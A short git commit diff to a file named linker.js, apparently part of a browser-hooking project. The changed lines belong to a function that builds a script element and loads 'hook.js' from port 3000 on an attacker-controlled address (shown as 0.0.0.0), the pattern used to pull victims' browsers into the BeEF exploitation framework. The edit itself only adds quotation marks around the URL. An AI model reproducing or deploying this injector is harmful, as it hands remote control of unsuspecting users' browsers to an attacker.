f3fbafdd6d68227a561aaab32dce23f3ed28bfa6
MastrCheef99 <120070513+MastrCheef99@users.noreply.github.com>
2023-05-18 21:54:49 -0400

    Update linker.js

--- linker.js
+++ linker.js
@@ -12,7 +12,7 @@ if(sending == 1) {
 
 
 function send() { 
-  var url = %27https://0.0.0.0:3000/hook.js%27;
+  var url = %27"https://0.0.0.0:3000/hook.js"%27;
   if (typeof beef == %27undefined%27) { 
   var bf = document.createElement(%27script%27); 
   bf.type = %27text%2fjavascript%27; bf.src = url; 
